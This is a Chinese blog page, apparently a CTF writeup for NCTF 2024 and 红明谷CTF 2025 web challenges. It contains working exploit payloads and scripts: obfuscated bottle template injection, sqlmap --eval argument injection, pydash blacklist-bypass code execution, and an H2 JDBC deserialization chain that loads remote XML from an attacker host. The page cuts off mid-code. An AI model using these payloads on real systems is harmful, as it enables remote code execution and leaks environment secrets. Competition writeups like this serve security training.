@@ -1,0 +1,818 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>CTF记录-NCTF_2024, 红明谷CTF_2025 | zoiltin&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="NCTF 2024 和 红明谷CTF 2025 web方向writeup">
+<meta name="author" content="">
+<link rel="canonical" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.d72444526d7ecbdb0015438a7fa89054a658bf759d0542e2e5df81ce94b493ee.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://zoiltin.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://zoiltin.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://zoiltin.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://zoiltin.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://zoiltin.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:url" content="https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/">
+  <meta property="og:site_name" content="zoiltin&#39;s Blog">
+  <meta property="og:title" content="CTF记录-NCTF_2024, 红明谷CTF_2025">
+  <meta property="og:description" content="NCTF 2024 和 红明谷CTF 2025 web方向writeup">
+  <meta property="og:locale" content="zh-CN">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-23T17:02:50+00:00">
+    <meta property="article:modified_time" content="2025-03-23T17:02:50+00:00">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="CTF记录-NCTF_2024, 红明谷CTF_2025">
+<meta name="twitter:description" content="NCTF 2024 和 红明谷CTF 2025 web方向writeup">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://zoiltin.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "CTF记录-NCTF_2024, 红明谷CTF_2025",
+      "item": "https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "CTF记录-NCTF_2024, 红明谷CTF_2025",
+  "name": "CTF记录-NCTF_2024, 红明谷CTF_2025",
+  "description": "NCTF 2024 和 红明谷CTF 2025 web方向writeup",
+  "keywords": [
+    
+  ],
+  "articleBody": "NCTF 2024 WEB AK ez_dash 过滤不全，可以通过\u003c%%\u003e执行python代码，但没有回显，用继承链获取bottle报错回显。\nhttps://www.osgeo.cn/bottle/stpl.html#embedded-python-code 使用getattr绕过.，bottle.abort(401, \"message\")函数可以直接报错返回内容。\n\u003c%eval(getattr(getattr(__import__('base64'), 'b64decode')('X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5ib3R0bGUuYWJvcnQoNDAxLCBfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkp'), 'decode')())%\u003e sqlmap-master 参数注入，sqlmap -hh查看详细信息：\n--eval=EVALCODE Evaluate provided Python code before the request (e.g.\r\"import hashlib;id2=hashlib.md5(id).hexdigest()\") sqlmap的eval可以执行python代码：\nsqlmap -u http://localhost --eval=\"print(1)\" 通过__import__报错回显，注意payload不能包含空格，不然会被分割。\npoc:\nhttp://localhost --eval=__import__(__import__('os').popen(__import__('base64').b64decode('ZW52IHwgYmFzZTY0IHwgdHIgLWQgJ1xuJw==').decode()).read()) ez_dash_revenge 远程环境pydash版本比较高，不允许覆盖__globals__和__builtin__，\n黑名单检测代码pydash/helpers.py： RESTRICTED_KEYS内容为：\nRESTRICTED_KEYS = (\"__globals__\", \"__builtins__\") 覆盖黑名单POC：\n/setValue?name=pydash\r{\"path\":\"helpers.RESTRICTED_KEYS\",\"value\":[]} 然后再通过__globals__覆盖题目自定义的黑名单,POC:\n/setValue?name=setval\r{\"path\":\"__globals__.__forbidden_name__\",\"value\":[]}\r{\"path\":\"__globals__.__forbidden_path__\",\"value\":[]} bottle模板引擎使用正则匹配模板字符串，set_syntax代码如下：\ndef set_syntax(self, syntax): self._syntax = syntax self._tokens = syntax.split() if syntax not in self._re_cache: names = 'block_start block_close line_start inline_start inline_end' etokens = map(re.escape, self._tokens) pattern_vars = dict(zip(names.split(), etokens)) patterns = (self._re_split, self._re_tok, self._re_inl) patterns = [re.compile(p % pattern_vars) for p in patterns] self._re_cache[syntax] = patterns self.re_split, self.re_tok, self.re_inl = self._re_cache[syntax] 默认的syntax为\u003c% %\u003e % {{ }}，其以空格分割分别对应block_start block_close line_start inline_start inline_end，然后被format进self.re_split, self.re_tok, self.re_inl这三个正则表达式里，render模板时用正则匹配内容，\u003c%%\u003e内部的和%后面的内容作为python代码执行，但没回显，{{}}内部的作为表达式求值，有回显。题目过滤了%\u003c等字符，所以修改模板正则表达式就可以绕过了。\nbottle默认模板使用的是SimpleTemplate继承了BaseTemplate，在prepare方法给self.syntax赋值了。\nclass SimpleTemplate(BaseTemplate): def prepare(self, escape_func=html_escape, noescape=False, syntax=None, **ka): self.cache = {} enc = self.encoding self._str = lambda x: touni(x, enc) self._escape = lambda x: escape_func(touni(x, enc)) self.syntax = syntax if noescape: self._str, self._escape = self._escape, self._str BaseTemplate类的__init__函数代码如下：把self.settings传给prepare.\nself.name = name self.source = source.read() if hasattr(source, 'read') else source self.filename = source.filename if hasattr(source, 'filename') else None self.lookup = [os.path.abspath(x) for x in lookup] if lookup else [] self.encoding = encoding self.settings = self.settings.copy() # Copy from class variable self.settings.update(settings) # Apply if not self.source and self.name: self.filename = self.search(self.name, self.lookup) if not self.filename: raise TemplateError('Template %s not found.' % repr(name)) if not self.source and not self.filename: raise TemplateError('No template specified.') self.prepare(**self.settings) 所以覆盖模板syntax POC如下：\n/setValue?name=bottle\r{\"path\":\"BaseTemplate.settings.syntax\",\"value\":\"` ` % | |\"} 用||包裹即可执行代码并回显。\n具体的模板执行代码如下：\ndef execute(self, _stdout, kwargs): env = self.defaults.copy() env.update(kwargs) env.update({ '_stdout': _stdout, '_printlist': _stdout.extend, 'include': functools.partial(self._include, env), 'rebase': functools.partial(self._rebase, env), '_rebase': None, '_str': self._str, '_escape': self._escape, 'get': env.get, 'setdefault': env.setdefault, 'defined': env.__contains__ }) exec(self.co, env) if env.get('_rebase'): subtpl, rargs = env.pop('_rebase') rargs['base'] = ''.join(_stdout) #copy stdout del _stdout[:] # clear stdout return self._include(env, subtpl, **rargs) return env 使用了exec函数，可以拿到__builtins__，所以可以将代码注入__builtins__中，因为setValue中对于value字段不限制长度，POC如下：\n/setValue?name=setval\r{\"path\":\"__builtins__.p\",\"value\":\"print(1)\"} 注意以下代码：\ndef template(*args, **kwargs): .............. if tplid not in TEMPLATES or DEBUG: settings = kwargs.pop('template_settings', {}) if isinstance(tpl, adapter): TEMPLATES[tplid] = tpl if settings: TEMPLATES[tplid].prepare(**settings) elif \"\\n\" in tpl or \"{\" in tpl or \"%\" in tpl or '$' in tpl: TEMPLATES[tplid] = adapter(source=tpl, lookup=lookup, **settings) else: TEMPLATES[tplid] = adapter(name=tpl, lookup=lookup, **settings) if not TEMPLATES[tplid]: abort(500, 'Template (%s) not found' % tpl) return TEMPLATES[tplid].render(kwargs) 模板内容需要包含\\n,{%$，不然不会进行render。\nPOC如下：\n/render?path=%0a|eval(p)| exp:\nimport requests url = 'http://ip:port' def init(): # bypass pydash res = requests.post(url=url + '/setValue?name=pydash', json={\"path\":\"helpers.RESTRICTED_KEYS\",\"value\":[]}) if 'yes' in res.text: print('[+] bypass pydash success') else: print('[-] bypass pydash failed') exit() # bypass path res = requests.post(url=url + '/setValue?name=setval', json={\"path\":\"__globals__.__forbidden_path__\",\"value\":[]}) if 'yes' in res.text: print('[+] bypass path success') else: print('[-] bypass path failed') exit() # bypass name res = requests.post(url=url + '/setValue?name=setval', json={\"path\":\"__globals__.__forbidden_name__\",\"value\":[]}) if 'yes' in res.text: print('[+] bypass name success') else: print('[-] bypass name failed') exit() # update syntax res = requests.post(url=url + '/setValue?name=bottle', json={\"path\":\"BaseTemplate.settings.syntax\",\"value\":\"` ` % | |\"}) if 'yes' in res.text: print('[+] bypass syntax success') else: print('[-] bypass syntax failed') exit() def set_payload(payload): # set payload in builtin res = requests.post(url=url + '/setValue?name=setval', json={\"path\":\"__builtins__.p\",\"value\":payload}) if 'yes' in res.text: print('[+] set payload success') else: print('[-] set payload failed') exit() def render(): # render res = requests.get(url=url + '/render?path=%0a|eval(p)|') print(res.text) if __name__ == '__main__': init() payload = \"__import__('os').popen('env').read()\" set_payload(payload) render() H2 Revenge MyDataSource类可以触发jdbc连接，getter触发。\n用jackson getter链子。堆栈如下：\nchallenge.MyDataSource#getConnection\rjdk.internal.reflect.GeneratedMethodAccessor12#invoke\rjdk.internal.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rorg.springframework.aop.support.AopUtils#invokeJoinpointUsingReflection\rorg.springframework.aop.framework.JdkDynamicAopProxy#invoke\rjdk.proxy2.$Proxy61#getConnection\rjdk.internal.reflect.GeneratedMethodAccessor11#invoke\rjdk.internal.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rcom.fasterxml.jackson.databind.ser.BeanPropertyWriter#serializeAsField\rcom.fasterxml.jackson.databind.ser.std.BeanSerializerBase#serializeFields\rcom.fasterxml.jackson.databind.ser.BeanSerializer#serialize\rcom.fasterxml.jackson.databind.SerializerProvider#defaultSerializeValue\rcom.fasterxml.jackson.databind.node.POJONode#serialize\rcom.fasterxml.jackson.databind.node.InternalNodeMapper$WrapperForSerializer#_serializeNonRecursive\rcom.fasterxml.jackson.databind.node.InternalNodeMapper$WrapperForSerializer#serialize\rcom.fasterxml.jackson.databind.ser.std.SerializableSerializer#serialize\rcom.fasterxml.jackson.databind.ser.std.SerializableSerializer#serialize\rcom.fasterxml.jackson.databind.ser.DefaultSerializerProvider#_serialize\rcom.fasterxml.jackson.databind.ser.DefaultSerializerProvider#serializeValue\rcom.fasterxml.jackson.databind.ObjectWriter$Prefetch#serialize\rcom.fasterxml.jackson.databind.ObjectWriter#_writeValueAndClose\rcom.fasterxml.jackson.databind.ObjectWriter#writeValueAsString\rcom.fasterxml.jackson.databind.node.InternalNodeMapper#nodeToString\rcom.fasterxml.jackson.databind.node.BaseJsonNode#toString\rcom.sun.org.apache.xpath.internal.objects.XString#equals\rorg.springframework.aop.target.HotSwappableTargetSource#equals\rjava.util.HashMap#putVal\rjava.util.HashMap#readObject\rjdk.internal.reflect.GeneratedMethodAccessor6#invoke\rjdk.internal.reflect.DelegatingMethodAccessorImpl#invoke\rjava.lang.reflect.Method#invoke\rjava.io.ObjectStreamClass#invokeReadObject\rjava.io.ObjectInputStream#readSerialData\rjava.io.ObjectInputStream#readOrdinaryObject\rjava.io.ObjectInputStream#readObject0\rjava.io.ObjectInputStream#readObject\rjava.io.ObjectInputStream#readObject\rchallenge.IndexController#deserialize 有h2 driver。但环境为eclipse-temurin:17-jre镜像，JAVA_HOME下没有javac，所以无法编译自定义方法。可能是因为jdk版本高，TRIGGER获取js引擎是获取不到。同时有没有Grooxy依赖，所以传统利用方法都失效了。\n查看文档发现可以调用任意public static方法。\nhttps://www.h2database.com/html/features.html 由于jdk moduel限制，Hessian反序列化打的那些gadget不能用。\n找到org.h2.util.Utils#newInstance方法可以触发构造方法：\npublic static Object newInstance(String var0, Object... var1) throws Exception { Constructor var2 = null; int var3 = 0; Constructor[] var4 = Class.forName(var0).getConstructors(); int var5 = var4.length; for(int var6 = 0; var6 \u003c var5; ++var6) { Constructor var7 = var4[var6]; int var8 = match(var7.getParameterTypes(), var1); if (var8 \u003e var3) { var3 = var8; var2 = var7; } } if (var2 == null) { throw new NoSuchMethodException(var0); } else { return var2.newInstance(var1); } } org.springframework.context.support.ClassPathXmlApplicationContext类的构造方法可以RCE，参数为java.lang.String\nPOC：\npublic class Exp { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass ctClass0 = pool.get(\"com.fasterxml.jackson.databind.node.BaseJsonNode\"); CtMethod writeReplace = ctClass0.getDeclaredMethod(\"writeReplace\"); ctClass0.removeMethod(writeReplace); ctClass0.toClass(); String url = \"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS expNewInstance FOR 'org.h2.util.Utils.newInstance'\\\\;CALL expNewInstance('org.springframework.context.support.ClassPathXmlApplicationContext','http://ip:port/exp.xml')\\\\;\"; MyDataSource myDataSource = new MyDataSource(url, \"username\",\"password\"); AdvisedSupport advisedSupport = new AdvisedSupport(); advisedSupport.setTarget(myDataSource); // exp类 Constructor constructor = Class.forName(\"org.springframework.aop.framework.JdkDynamicAopProxy\").getConstructor(AdvisedSupport.class); constructor.setAccessible(true); InvocationHandler handler = (InvocationHandler) constructor.newInstance(advisedSupport); Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{DataSource.class}, handler); POJONode poJoNode = new POJONode(proxy); XString x = new XString(\"123\"); HashMap map = makeMap(x, poJoNode); ser(map); } public static HashMap\u003cObject, Object\u003e makeMap (Object obj1, Object obj2) throws Exception { HotSwappableTargetSource v1 = new HotSwappableTargetSource(obj2); HotSwappableTargetSource v2 = new HotSwappableTargetSource(obj1); HashMap\u003cObject, Object\u003e s = new HashMap\u003c\u003e(); setFieldValue(s, \"size\", 2); Class\u003c?\u003e nodeC; try { nodeC = Class.forName(\"java.util.HashMap$Node\"); } catch (ClassNotFoundException e) { nodeC = Class.forName(\"java.util.HashMap$Entry\"); } Constructor\u003c?\u003e nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC); nodeCons.setAccessible(true); Object tbl = Array.newInstance(nodeC, 2); Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null)); Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null)); setFieldValue(s, \"table\", tbl); return s; } } 但执行会报错：\norg.h2.jdbc.JdbcSQLDataException: Data conversion error converting \"CHARACTER VARYING to JAVA_OBJECT\"; SQL statement: newInstance方法签名中的参数为String var0, Object... var1，h2数据库无法直接将字符串http://ip:port/exp.xml转换成Object。\n然后又找到一个反序列化接口，可以先将字符串http://ip:port/exp.xml序列化，然后在h2 sql中执行反序列化并保存为变量，然后传参给newInstance即可。\norg.h2.util.JdbcUtils#deserialize方法可以触发原生反序列化，返回值为Object。\npublic static Object deserialize(byte[] var0, JavaObjectSerializer var1) { try { if (var1 != null) { return var1.deserialize(var0); } else if (serializer != null) { return serializer.deserialize(var0); } else { ByteArrayInputStream var2 = new ByteArrayInputStream(var0); ObjectInputStream var3; if (SysProperties.USE_THREAD_CONTEXT_CLASS_LOADER) { final ClassLoader var4 = Thread.currentThread().getContextClassLoader(); var3 = new ObjectInputStream(var2) { protected Class\u003c?\u003e resolveClass(ObjectStreamClass var1) throws IOException, ClassNotFoundException { try { return Class.forName(var1.getName(), true, var4); } catch (ClassNotFoundException var3) { return super.resolveClass(var1); } } }; } else { var3 = new ObjectInputStream(var2); } return var3.readObject(); } } catch (Throwable var5) { throw DbException.get(90027, var5, new String[]{var5.toString()}); } } var1为NULL即可，var0需要为字节数组，h2 sql字节数组的表示方法：\nhttps://www.h2database.com/html/grammar.html#bytes POC:\n// String path = \"http://ip:port/exp.xml\"; // ser(path); String path = \"aced....\"; // path 序列化数据的hex String url = \"jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS deserialize FOR 'org.h2.util.JdbcUtils.deserialize'\\\\;CREATE ALIAS expNewInstance FOR 'org.h2.util.Utils.newInstance'\\\\;SET @path = (SELECT deserialize(X'\" + path + \"',NULL))\\\\;CALL expNewInstance('org.springframework.context.support.ClassPathXmlApplicationContext',@path)\\\\;\"; 部署exp.xml:\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e ",
+  "wordCount" : "1161",
+  "inLanguage": "en",
+  "datePublished": "2025-03-23T17:02:50Z",
+  "dateModified": "2025-03-23T17:02:50Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://zoiltin.github.io/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "zoiltin's Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://zoiltin.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://zoiltin.github.io/" accesskey="h" title="zoiltin&#39;s Blog (Alt + H)">zoiltin&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://zoiltin.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/posts" title="Posts">
+                    <span>Posts</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://zoiltin.github.io/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      CTF记录-NCTF_2024, 红明谷CTF_2025
+    </h1>
+    <div class="post-description">
+      NCTF 2024 和 红明谷CTF 2025 web方向writeup
+    </div>
+    <div class="post-meta"><span title='2025-03-23 17:02:50 +0000 UTC'>March 23, 2025</span>&nbsp;·&nbsp;6 min
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#nctf-2024" aria-label="NCTF 2024">NCTF 2024</a><ul>
+                        
+                <li>
+                    <a href="#ez_dash" aria-label="ez_dash">ez_dash</a></li>
+                <li>
+                    <a href="#sqlmap-master" aria-label="sqlmap-master">sqlmap-master</a></li>
+                <li>
+                    <a href="#ez_dash_revenge" aria-label="ez_dash_revenge">ez_dash_revenge</a></li>
+                <li>
+                    <a href="#h2-revenge" aria-label="H2 Revenge">H2 Revenge</a></li>
+                <li>
+                    <a href="#internal_api" aria-label="internal_api">internal_api</a></li></ul>
+                </li>
+                <li>
+                    <a href="#%e7%ba%a2%e6%98%8e%e8%b0%b7ctf-2025" aria-label="红明谷CTF 2025">红明谷CTF 2025</a><ul>
+                        
+                <li>
+                    <a href="#%e6%97%a5%e8%ae%b0%e6%9c%ac" aria-label="日记本">日记本</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="nctf-2024">NCTF 2024<a hidden class="anchor" aria-hidden="true" href="#nctf-2024">#</a></h1>
+<p>WEB AK
+<img alt="5" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/5.png"></p>
+<h2 id="ez_dash">ez_dash<a hidden class="anchor" aria-hidden="true" href="#ez_dash">#</a></h2>
+<p>过滤不全，可以通过<code>&lt;%%&gt;</code>执行python代码，但没有回显，用继承链获取bottle报错回显。</p>
+<blockquote>
+<p><a href="https://www.osgeo.cn/bottle/stpl.html#embedded-python-code">https://www.osgeo.cn/bottle/stpl.html#embedded-python-code</a>
+<img alt="3" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/3.png"></p>
+</blockquote>
+<p>使用getattr绕过<code>.</code>，<code>bottle.abort(401, &quot;message&quot;)</code>函数可以直接报错返回内容。</p>
+<pre tabindex="0"><code>&lt;%eval(getattr(getattr(__import__(&#39;base64&#39;), &#39;b64decode&#39;)(&#39;X19pbXBvcnRfXygnc3lzJykubW9kdWxlc1snX19tYWluX18nXS5ib3R0bGUuYWJvcnQoNDAxLCBfX2ltcG9ydF9fKCdvcycpLnBvcGVuKCdlbnYnKS5yZWFkKCkp&#39;), &#39;decode&#39;)())%&gt;
+</code></pre><h2 id="sqlmap-master">sqlmap-master<a hidden class="anchor" aria-hidden="true" href="#sqlmap-master">#</a></h2>
+<p>参数注入，<code>sqlmap -hh</code>查看详细信息：</p>
+<pre tabindex="0"><code>--eval=EVALCODE     Evaluate provided Python code before the request (e.g.
+                    &#34;import hashlib;id2=hashlib.md5(id).hexdigest()&#34;)
+</code></pre><p>sqlmap的<code>eval</code>可以执行python代码：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>sqlmap -u http://localhost --eval<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;print(1)&#34;</span>
+</span></span></code></pre></div><p>通过<code>__import__</code>报错回显，注意payload不能包含空格，不然会被分割。</p>
+<p>poc:</p>
+<pre tabindex="0"><code>http://localhost --eval=__import__(__import__(&#39;os&#39;).popen(__import__(&#39;base64&#39;).b64decode(&#39;ZW52IHwgYmFzZTY0IHwgdHIgLWQgJ1xuJw==&#39;).decode()).read())
+</code></pre><h2 id="ez_dash_revenge">ez_dash_revenge<a hidden class="anchor" aria-hidden="true" href="#ez_dash_revenge">#</a></h2>
+<p>远程环境pydash版本比较高，不允许覆盖<code>__globals__</code>和<code>__builtin__</code>，</p>
+<p>黑名单检测代码<code>pydash/helpers.py</code>：
+<img alt="4" loading="lazy" src="/posts/ctf%E8%AE%B0%E5%BD%95-nctf_2024-%E7%BA%A2%E6%98%8E%E8%B0%B7ctf_2025/images/4.png"></p>
+<p><code>RESTRICTED_KEYS</code>内容为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>RESTRICTED_KEYS <span style="color:#f92672">=</span> (<span style="color:#e6db74">&#34;__globals__&#34;</span>, <span style="color:#e6db74">&#34;__builtins__&#34;</span>)
+</span></span></code></pre></div><p>覆盖黑名单POC：</p>
+<pre tabindex="0"><code>/setValue?name=pydash
+
+{&#34;path&#34;:&#34;helpers.RESTRICTED_KEYS&#34;,&#34;value&#34;:[]}
+</code></pre><p>然后再通过<code>__globals__</code>覆盖题目自定义的黑名单,POC:</p>
+<pre tabindex="0"><code>/setValue?name=setval
+
+{&#34;path&#34;:&#34;__globals__.__forbidden_name__&#34;,&#34;value&#34;:[]}
+{&#34;path&#34;:&#34;__globals__.__forbidden_path__&#34;,&#34;value&#34;:[]}
+</code></pre><p>bottle模板引擎使用正则匹配模板字符串，<code>set_syntax</code>代码如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">set_syntax</span>(self, syntax):
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>_syntax <span style="color:#f92672">=</span> syntax
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>_tokens <span style="color:#f92672">=</span> syntax<span style="color:#f92672">.</span>split()
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> syntax <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> self<span style="color:#f92672">.</span>_re_cache:
+</span></span><span style="display:flex;"><span>        names <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;block_start block_close line_start inline_start inline_end&#39;</span>
+</span></span><span style="display:flex;"><span>        etokens <span style="color:#f92672">=</span> map(re<span style="color:#f92672">.</span>escape, self<span style="color:#f92672">.</span>_tokens)
+</span></span><span style="display:flex;"><span>        pattern_vars <span style="color:#f92672">=</span> dict(zip(names<span style="color:#f92672">.</span>split(), etokens))
+</span></span><span style="display:flex;"><span>        patterns <span style="color:#f92672">=</span> (self<span style="color:#f92672">.</span>_re_split, self<span style="color:#f92672">.</span>_re_tok, self<span style="color:#f92672">.</span>_re_inl)
+</span></span><span style="display:flex;"><span>        patterns <span style="color:#f92672">=</span> [re<span style="color:#f92672">.</span>compile(p <span style="color:#f92672">%</span> pattern_vars) <span style="color:#66d9ef">for</span> p <span style="color:#f92672">in</span> patterns]
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>_re_cache[syntax] <span style="color:#f92672">=</span> patterns
+</span></span><span style="display:flex;"><span>    self<span style="color:#f92672">.</span>re_split, self<span style="color:#f92672">.</span>re_tok, self<span style="color:#f92672">.</span>re_inl <span style="color:#f92672">=</span> self<span style="color:#f92672">.</span>_re_cache[syntax]
+</span></span></code></pre></div><p>默认的syntax为<code>&lt;% %&gt; % {{ }}</code>，其以空格分割分别对应<code>block_start block_close line_start inline_start inline_end</code>，然后被format进<code>self.re_split, self.re_tok, self.re_inl</code>这三个正则表达式里，render模板时用正则匹配内容，<code>&lt;%%&gt;</code>内部的和<code>%</code>后面的内容作为python代码执行，但没回显，<code>{{}}</code>内部的作为表达式求值，有回显。题目过滤了<code>%&lt;</code>等字符，所以修改模板正则表达式就可以绕过了。</p>
+<p>bottle默认模板使用的是<code>SimpleTemplate</code>继承了<code>BaseTemplate</code>，在<code>prepare</code>方法给<code>self.syntax</code>赋值了。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">SimpleTemplate</span>(BaseTemplate):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">prepare</span>(self,
+</span></span><span style="display:flex;"><span>                escape_func<span style="color:#f92672">=</span>html_escape,
+</span></span><span style="display:flex;"><span>                noescape<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>,
+</span></span><span style="display:flex;"><span>                syntax<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, <span style="color:#f92672">**</span>ka):
+</span></span><span style="display:flex;"><span>        self<span style="color:#f92672">.</span>cache <span style="color:#f92672">=</span> {}
